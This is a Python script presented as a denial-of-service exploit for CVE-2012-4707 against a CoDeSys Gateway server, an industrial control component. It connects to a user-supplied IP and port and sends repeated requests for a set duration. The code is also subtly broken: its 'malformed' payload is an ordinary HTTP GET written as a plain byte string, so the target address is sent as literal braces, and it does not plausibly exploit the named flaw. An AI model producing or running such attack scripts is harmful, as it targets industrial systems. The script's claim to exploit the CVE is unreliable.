import socket
import argparse
import time

def send_dos_request(target_ip, target_port, attack_duration):
    """
    Sends malformed packets to the target CoDeSys Gateway server.
    """
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the target IP and port
        sock.connect((target_ip, target_port))
        print(f"Connected to {target_ip}:{target_port}")
        
        start_time = time.time()
        while time.time() - start_time < attack_duration:
            # Send malformed data to trigger DoS
            sock.send(b'GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n')
            print(f"Sending attack payload to {target_ip}:{target_port}")
            time.sleep(0.1)  # Sleep to control rate of requests

    except Exception as e:
        print(f"Error connecting to {target_ip}:{target_port}: {e}")
    finally:
        sock.close()
        print("Attack completed or connection closed.")

def parse_arguments():
    """
    Parses command-line arguments for the attack.
    """
    parser = argparse.ArgumentParser(description="Simulate CVE-2012-4707 Denial of Service attack on CoDeSys Gateway Server.")
    
    # Required arguments
    parser.add_argument("target_ip", help="Target IP address of the CoDeSys Gateway Server")
    parser.add_argument("target_port", type=int, help="Target port of the CoDeSys Gateway Server")
    
    # Optional arguments
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration of the attack in seconds (default: 60)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

    return parser.parse_args()

def main():
    args = parse_arguments()

    if args.verbose:
        print(f"Starting attack on {args.target_ip}:{args.target_port} for {args.duration} seconds...")
    
    send_dos_request(args.target_ip, args.target_port, args.duration)
    
    if args.verbose:
        print("Attack simulation completed.")

if __name__ == "__main__":
    main()
